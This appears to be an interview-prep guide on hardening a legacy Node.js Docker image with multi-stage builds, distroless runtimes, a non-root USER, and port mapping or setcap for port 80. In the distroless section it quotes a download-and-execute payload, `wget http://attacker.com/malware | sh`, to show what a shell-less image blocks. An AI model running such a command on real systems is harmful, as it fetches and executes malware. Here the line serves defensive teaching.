# **Question 6: Security & Supply Chain**

**Focus:** **Vulnerability Management, Attack Surfaces, and Privilege Escalation**

**Scenario:**
You are hired to audit a legacy microservice. You look at the `Dockerfile` and see this:

```dockerfile
FROM node:18
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]
```

You run a security scanner (like Trivy or Snyk) against the built image, and it lights up like a Christmas tree: **450 Vulnerabilities (40 Critical)**. Most of these CVEs belong to OS-level packages (like `curl`, `bash`, `openssl`) that the application doesn't even use.

Furthermore, a recent penetration test revealed that if an attacker finds an RCE (Remote Code Execution) flaw in your Node.js app, they immediately drop into a shell as the **`root` user** inside the container.

**Question:**

1.  **Reducing the Attack Surface:** Without changing the application's source code, what architectural changes would you make to the Dockerfile to drastically reduce the image size and eliminate those 400+ unused OS vulnerabilities?
2.  **Identity & Permissions:** How do you fix the issue where the application runs as the `root` user by default? Provide the specific Dockerfile directive.
3.  **The Privileged Port Catch-22:** Your team implements your non-root fix, but suddenly the container crashes on startup with a `Permission denied` error. You realize `server.js` is trying to bind to **Port 80**. Since non-root users cannot bind to ports below 1024, how do you solve this elegantly in a containerized environment?

---

## Background (Why This Matters)

A legacy Dockerfile like this is an extremely common audit finding:

```dockerfile
FROM node:18
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]
```

### What's Wrong With It

| Problem | Impact |
|---|---|
| Full `node:18` base image | 400+ unused OS packages, 450 CVEs |
| Runs as `root` | RCE = attacker gets root shell inside container |
| No build/runtime separation | Dev dependencies and build tools ship to production |
| `npm install` instead of `npm ci` | Inconsistent installs, includes devDependencies |
| No least-privilege user | Full container filesystem accessible on exploit |

This is not just a "best practices" conversation — it's a **blast radius** conversation. The goal is: if an attacker finds an RCE, how little can they do with it?

---

## Q1 — Reducing the Attack Surface (The Three-Level Answer)

### Level 1 — Switch to Alpine (Quick Win)

```dockerfile
# Before
FROM node:18          # ~1GB, 400+ packages, 450 CVEs

# After
FROM node:18-alpine   # ~180MB, minimal packages, dramatically fewer CVEs
```

**Why Alpine:** It's a minimal Linux distribution — only what's needed to run the OS. Most of the 450 CVEs are in packages like `curl`, `bash`, `apt`, `openssl` that exist in `node:18` but your app never uses.

---

### Level 2 — Multi-Stage Build (Separates Build from Runtime)

```dockerfile
# Stage 1: Build — has all the tools needed to compile/install
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production     # ci = clean install, reproducible
COPY . .

# Stage 2: Runtime — has ONLY what's needed to run the app
FROM node:18-alpine
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app .
CMD ["node", "server.js"]
```

**What multi-stage removes from the final image:**
- `npm` itself
- Build compilers (`gcc`, `make`, `python`)
- devDependencies
- Temporary cache files
- Any intermediate build artifacts

> The final image only contains what `--from=builder` explicitly copies. Everything else is discarded.

---

### Level 3 — Distroless (Production Gold Standard)

```dockerfile
# Stage 1: Build
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

# Stage 2: Runtime — distroless contains ONLY the Node.js runtime
FROM gcr.io/distroless/nodejs18
WORKDIR /app
COPY --from=builder /app /app
USER nonroot
CMD ["server.js"]
```

### What Distroless Actually Is

A distroless image contains **only the language runtime** — nothing else.

| What's present | What's absent |
|---|---|
| Node.js runtime | `/bin/sh` or `/bin/bash` |
| Your app files | `curl`, `wget` |
| Node standard library | `apt`, `apk` |
| SSL certificates | Any package manager |
| | `ls`, `cat`, `ps`, `top` |

### Why the Absence of a Shell Matters (The Critical Security Point)

> Even if an attacker finds an RCE vulnerability in your Node.js code, they **cannot execute shell payloads**. Standard exploit techniques like `wget http://attacker.com/malware | sh` fail because neither `wget` nor `sh` exist in the image. Lateral movement is nearly impossible.

**CVE reduction:**
- `node:18` → ~450 CVEs
- `node:18-alpine` → ~50-80 CVEs
- `gcr.io/distroless/nodejs18` → ~5-20 CVEs

### Interview Phrasing

> "I'd do this in three layers. First, switch to Alpine to drop most unused OS packages immediately. Second, use a multi-stage build so build tools never ship to production. Third, use a distroless runtime image — the critical point is that distroless images have no shell. Even with a successful RCE, an attacker cannot run shell commands or download malware because those binaries literally don't exist in the filesystem."

---

## Q2 — Identity & Permissions: Fix the Root User Problem

### The Problem

By default, Docker containers run as `root` (UID 0). If an attacker exploits an RCE in your app:

```
RCE found in Node.js app
        ↓
Attacker executes arbitrary code
        ↓
Code runs as root inside container
        ↓
Attacker can: read all files, modify binaries,
              attempt container breakout,
              pivot to host if misconfigured
```

### The Fix — USER Directive

```dockerfile
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

FROM node:18-alpine
WORKDIR /app

# Option A: Use the built-in 'node' user (node:alpine ships with one)
COPY --chown=node:node --from=builder /app .
USER node

# Option B: Create a dedicated user (more explicit, use on other base images)
# RUN addgroup -S appgroup && adduser -S appuser -G appgroup
# COPY --chown=appuser:appgroup --from=builder /app .
# USER appuser

CMD ["node", "server.js"]
```

### The `--chown` Flag — Critical Gotcha (Staff-Level Detail)

When you switch to `USER appuser`, the app runs with restricted permissions. If the app needs to **write** to any directory at runtime (logs, temp files, uploads), it must own those directories **before** the `USER` directive.

```dockerfile
# ❌ WRONG — appuser can't write to /app/logs at runtime
RUN mkdir -p /app/logs
USER appuser

# ✅ CORRECT — give ownership before switching user
RUN mkdir -p /app/logs && chown -R appuser:appgroup /app/logs
USER appuser

# ✅ ALSO CORRECT — use --chown on COPY
COPY --chown=appuser:appgroup --from=builder /app .
USER appuser
```

### What the USER Directive Achieves

| Before (root) | After (appuser) |
|---|---|
| RCE = root shell | RCE = restricted user shell |
| Can modify any file | Can only write to owned directories |
| Can install packages | Cannot use package managers |
| Can attempt container breakout | Severely limited capability |
| Full `/etc/passwd` access | No privilege escalation path |

### Interview Phrasing

> "Add a `USER` directive. I'd either use the built-in `node` user that comes with `node:alpine`, or create a dedicated `appuser` with `addgroup`/`adduser`. The key detail is to use `COPY --chown=appuser:appgroup` or `RUN chown` before the `USER` directive — otherwise any directory the app needs to write to at runtime will throw a Permission Denied error, which is a common gotcha when teams first implement this."

---

## Q3 — The Privileged Port Catch-22 (Port 80 Problem)

### Why It Crashes

Linux kernel rule: **only root can bind to ports below 1024**.

```
Container starts
      ↓
server.js runs as appuser (non-root)
      ↓
server.js calls app.listen(80)
      ↓
Kernel: "UID 1000 cannot bind to port 80"
      ↓
Error: EACCES: Permission denied
      ↓
Container crashes
```

### The Elegant Solution — Port Mapping (Industry Standard)

Change the application to listen on a high port (3000, 8080, 8000) and use Docker's port mapping to expose it externally on 80.

```javascript
// server.js — listen on high port internally
app.listen(3000);
```

```bash
# Map external port 80 to internal port 3000
docker run -p 80:3000 my-payment-service
```

```yaml
# docker-compose.yml
services:
  app:
    image: my-payment-service
    ports:
      - "80:3000"     # host:container
```

```yaml
# Kubernetes Service
apiVersion: v1
kind: Service
spec:
  ports:
    - port: 80          # external
      targetPort: 3000  # container internal
```

### Why This Is the Right Architecture

In real production, containers **never** need privileged ports because a reverse proxy or load balancer sits in front:

```
Internet (443/80)
        ↓
Load Balancer / Ingress Controller (handles TLS)
        ↓
Reverse Proxy — Nginx / Envoy / Traefik (80/443)
        ↓
Container (3000) — non-root, no privileged ports needed
```

> The container is never directly exposed to the internet. It only needs a high port internally.

### Bonus: Linux Capabilities Alternative (Staff/Principal Detail)

If you absolutely cannot change the port (legacy hardcoded app, no source access), you can grant **one specific capability** to the binary without running as root:

```dockerfile
# Grant only the port-binding capability to the node binary
RUN setcap cap_net_bind_service=+ep /usr/local/bin/node
USER appuser
# Now node can bind to port 80 as a non-root user
```

This uses **Linux Capabilities** — a way to grant specific root-only privileges to a binary without giving it full root access. This is the surgical alternative to running as root.

| Approach | Security | Flexibility |
|---|---|---|
| Run as root | ❌ Bad | ✅ Works |
| Port mapping `-p 80:3000` | ✅ Best | ✅ Works (industry standard) |
| `setcap cap_net_bind_service` | ✅ Good | Works without source changes |

---

## Final Production-Grade Dockerfile

```dockerfile
# ─── Stage 1: Build ───────────────────────────────────────────
FROM node:18-alpine AS builder
WORKDIR /app

# Copy manifests first — layer cache optimization
COPY package*.json ./
RUN npm ci --only=production

COPY . .

# ─── Stage 2: Runtime ─────────────────────────────────────────
FROM gcr.io/distroless/nodejs18
WORKDIR /app

# Copy with correct ownership
COPY --from=builder /app /app

# Run as non-root
USER nonroot

# Exec form — ensures PID 1 receives signals correctly
CMD ["server.js"]
```

### What This Dockerfile Achieves

| Problem | Fix Applied | Result |
|---|---|---|
| 450 CVEs | Distroless runtime | ~5-20 CVEs remain |
| Root user | `USER nonroot` | RCE blast radius minimized |
| Port 80 issue | App listens on 3000, `-p 80:3000` at runtime | Non-root networking works |
| Dev deps in production | `npm ci --only=production` | Supply chain risk reduced |
| Build tools in image | Multi-stage build | Smaller, cleaner final image |
| Shell-based attacks | Distroless (no shell) | Cannot execute shell payloads |

---

## Senior Engineer Answer (Full Interview Script)

> "I'd tackle this in three layers. For the attack surface, I'd first switch to a multi-stage build — the build stage has all the tools to install dependencies, but the final runtime stage only copies over the production artifacts. Then I'd use a distroless runtime image. The critical point about distroless is that it contains no shell — so even if an attacker finds an RCE in the Node.js code, they can't execute shell payloads or use `wget` to download malware. Those binaries don't exist in the filesystem. This alone typically reduces 450 CVEs down to under 20.
>
> For the root user problem, I'd add a `USER` directive — either the built-in `node` user on Alpine, or a dedicated `appuser` created with `addgroup`/`adduser`. The important gotcha here is to use `COPY --chown` or `RUN chown` before the `USER` directive, so the app can write to any directories it needs at runtime.
>
> For the Port 80 crash — this is a kernel restriction, not a Docker restriction. Non-root users can't bind below 1024. The elegant solution is to have the app listen on port 3000 internally and use Docker's port mapping `-p 80:3000` to expose it externally. In production this doesn't matter anyway because containers sit behind a load balancer or reverse proxy that handles port 80 and 443 — the container never needs a privileged port. If you can't change the source code, there's also `setcap cap_net_bind_service` which grants just the port-binding capability to the node binary without making it run as root."

---

## One-Line Revision Summary

> Multi-stage build strips build tools → distroless runtime eliminates the shell (RCE without a shell = attacker with no weapons) → `USER nonroot` limits blast radius → `COPY --chown` prevents runtime write failures → app listens on high port, `-p 80:3000` maps it externally → `setcap cap_net_bind_service` as the legacy alternative to port mapping.

---

## Interview Delivery Tips

1. **The shell insight is the differentiator:** Don't just say "distroless is smaller." Say "distroless has no shell — even a successful RCE can't execute standard payloads." This is what makes the interviewer lean forward.
2. **Name the `--chown` gotcha:** Most candidates say "add USER directive" and stop. Mentioning `COPY --chown` before `USER` shows you've actually debugged this in production.
3. **"Blast radius" is the right vocabulary:** Use it when discussing the root user fix — "the USER directive minimizes the blast radius of an RCE."
4. **Port mapping is the answer, not a workaround:** Frame it as the correct architecture — "containers sit behind a reverse proxy in production, they never need privileged ports."
5. **`setcap` is the bonus:** Mentioning Linux Capabilities (`cap_net_bind_service`) without being asked signals staff-level systems knowledge.
6. **Connect CVE count to business risk:** "450 CVEs with 40 critical means your security team gets 40 alerts from every scan, they start ignoring them — that's how real breaches happen."